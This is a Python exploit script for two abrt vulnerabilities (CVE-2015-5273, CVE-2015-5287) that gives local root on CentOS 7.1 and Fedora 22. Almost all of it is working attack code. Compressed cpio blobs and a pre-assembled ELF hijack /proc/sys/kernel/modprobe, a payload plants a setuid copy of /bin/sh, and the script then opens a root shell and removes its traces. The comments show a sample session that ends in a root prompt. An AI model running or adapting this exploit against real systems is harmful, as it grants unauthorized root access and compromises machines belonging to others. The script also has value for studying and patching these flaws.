#!/usr/bin/python
# CVE-2015-5273 + CVE-2015-5287
# CENTOS 7.1/Fedora22 local root (probably works on SL and older versions too)
# abrt-hook-ccpp insecure open() usage + abrt-action-install-debuginfo insecure temp directory usage
# rebel 09/2015
# ----------------------------------------

# [user@localhost ~]$ id
# uid=1000(user) gid=1000(user) groups=1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
# [user@localhost ~]$ cat /etc/redhat-release 
# CentOS Linux release 7.1.1503 (Core) 
# [user@localhost ~]$ python abrt-centos-fedora.py
# -- lots of boring output, might take a while on a slow connection --
# /var/spool/abrt/abrt-hax-coredump created
# executing crashing process..
# success
# bash-4.2# id
# uid=0(root) gid=1000(user) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023


import time,os,datetime,sys,resource,socket


fedora = "Fedora" in open("/etc/redhat-release").read()

# mkdir dir1
# ln -s /var/spool/abrt dir1/hax
# mkdir dir2
# mkdir dir2/hax
# ln -s /proc/sys/kernel/modprobe dir2/hax/abrt-hax-coredump
# cd dir1
# find . -depth -print | cpio -o > ../cpio1
# cd ../dir2
# find . -depth -print | cpio -o > ../cpio2

cpio1 = 'x\x9c;^\xc8\xcc\xa1\xb0\xef\xff\xc2\x17\xcc/\x98\x19\x19\x18\x18>\x86\xde\xdc\xc8\x02\xa4\xf9\x192\x12+\x18\xf4\xcb\x12\x8b\xf4\x8b\x0b\xf2\xf3s\xf4\x13\x93\x8aJ\x18\x8e\x03U\xb3\xef\xfb\xeb\x08R\xcd\x04U\r\xa2\x19\x18\xf4\x80r\x0cp\xc0\x08\xa5\xb9\xc1dH\x90\xa3\xa7\x8fk\x90\xa2\xa2"\xc3(\x18d\x00\x00\x16\xb9\x1bA'.decode("zip")
cpio2 = 'x\x9c;^\xc8\xcc\x917\xfb\xff\xc2\x17\xcc/\x98\x19\x19\x18\x18>\x86\xde\xdc(\x06\xa4%\x192\x12+\xf4\x13\x93\x8aJt\x81\x0c\xdd\xe4\xfc\xa2\xd4\x94\xd2\xdc\x02\x06\xfd\x82\xa2\xfcd\xfd\xe2\xcab\xfd\xec\xd4\xa2\xbc\xd4\x1c\xfd\xdc\xfc\x14\xa0PR*\xc3q\xa0I\x19\xb3\xff:\x82Lb\x82\x9a\xc4\xc2\x00\x02@\x03\xc0\xb2+\xef@d\x99\xa1\xb2L`Y=\xa0\x1c\x03\x1c0Bin0\x19\x12\xe4\xe8\xe9\xe3\x1a\xa4\xa8\xa8\xc80\nh\x02\x00\x01\x980\x88'.decode("zip")

if fedora:
	cpio1 = cpio1.replace("/var/spool/abrt","/var/tmp///abrt")

payload = "#!/bin/sh\ncp /bin/sh /tmp/sh\nchmod 6755 /tmp/sh\n"


# we use a 32 bit binary because [vsyscall] will be at the end of the coredump on 64 bit binaries
# and we can't control the contents of that region. on 32 bit binaries [stack] is at the end

# the crashing binary will just fill the stack with /tmp/hax.sh which subsequently gets written
# to /proc/sys/kernel/modprobe by /usr/libexec/abrt-hook-ccpp

elf = 'x\x9c\xabw\xf5qcddd\x80\x01&\x06f\x06\x10/\xa4\x81\x85\xc3\x84\x01\x01L\x18\x14\x18`\xaa\xe0\xaa\x81j@x1\x90\t\xc2\xac 1\x01\x06\x06\x97F\x1b\x15\xfd\x92\xdc\x82\xd2o\x8dg\xfe\xf3\x03\xf9\xbb\xbe\x00\xb5\xec\x14\x01\xca\xee\xee\x07\xaa\xd7<\xd3\xc5\xdc\xc1\xa2\xe2\xe2\xfc\xe8{\xf3\x1b\x11\xaf\xe6_\x0c\xa5\x8fv8\x02\xc1\xff\x07\xfaP\x00\xd4\xad\x9f\x91X\xa1W\x9c\xc1\xc5\x00\x00-f"X'.decode("zip")

# most people don't have nasm installed so i preassembled it
# if you're not brave enough to run the preassembled file, here's the code :)

"""
; abrt-hax.asm
; nasm -f bin -o abrt-hax abrt-hax.asm
BITS 32
                org     0x08048000
ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  ehdrsize      equ     $ - ehdr
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      $$                              ;   p_paddr
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      5                               ;   p_flags
                dd      0x1000                          ;   p_align
  phdrsize      equ     $ - phdr

_start:
inc esp
cmp dword [esp],0x706d742f
jne l
or esp,0xfff
inc esp
mov edx,500
l3:
mov ecx,msglen
mov ebx,message
sub esp,ecx
l2:
mov al,[ebx]
mov [esp],al
inc esp
inc ebx
loop l2
sub esp,msglen
dec edx
cmp edx,0
jne l3
mov eax,0x41414141
jmp eax
message         db      '////////tmp/hax.sh',0x0a,0
msglen          equ     $-message
"""



build_id = os.popen("eu-readelf -n /usr/bin/hostname").readlines()[-1].split()[-1]

os.chdir("/tmp")


open("build_ids","w+").write(build_id + "\n")

print build_id


def child():
	timestamp = int(time.time())

	for i in xrange(0,3):
		try:
			t = datetime.datetime.fromtimestamp(timestamp+i)
			d = "/var/tmp/abrt-tmp-debuginfo-%s.%u" % (t.strftime("%Y-%m-%d-%H:%M:%S"), os.getpid())
			os.mkdir(d)
			os.chmod(d,0777)
			os.symlink("/var/tmp/haxfifo",d+"/unpacked.cpio")
			print "created %s" % d
		except: pass

	os.execl("/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache","abrt-action-install-debuginfo-to-abrt-cache","-y")

try:
	os.mkfifo("/var/tmp/haxfifo")
	os.chmod("/var/tmp/haxfifo",0666)
except:
	pass

def fifo(a):
	print "reading from fifo.."
	open("/var/tmp/haxfifo").read()
	print "done"

	print "writing to fifo.."
	open("/var/tmp/haxfifo","w+").write(a)
	print "done"

if os.fork() == 0: child()

print "first cpio..."
fifo(cpio1)

os.wait()
time.sleep(1)

if os.fork() == 0: child()
print "second cpio..."
fifo(cpio2)

os.wait()
time.sleep(1)

if fedora:
	sym = "/var/tmp/abrt/abrt-hax-coredump"
else:
	sym = "/var/spool/abrt/abrt-hax-coredump"

try:
	os.lstat(sym)
except:
	print "could not create symlink"
	sys.exit(-1)

print "%s created" % sym

open("/tmp/abrt-hax","w+").write(elf)
os.chmod("/tmp/abrt-hax",0755)

if os.fork() == 0:
	resource.setrlimit(resource.RLIMIT_CORE,(resource.RLIM_INFINITY,resource.RLIM_INFINITY,))
	print "executing crashing process.."
	os.execle("/tmp/abrt-hax","",{})

os.wait()
time.sleep(1)	

if "/tmp/hax" not in open("/proc/sys/kernel/modprobe").read():
	print "could not modify /proc/sys/kernel/modprobe"
	sys.exit(-1)

open("/tmp/hax.sh","w+").write(payload)
os.chmod("/tmp/hax.sh",0755)

try:
	socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)
except:
	pass

time.sleep(0.5)

try:
	os.stat("/tmp/sh")
except:
	print "could not create suid"
	sys.exit(-1)

print "success"

os.execl("/tmp/sh","sh","-p","-c",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;rm -rf /var/cache/abrt-di/hax;python -c "import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');"''')
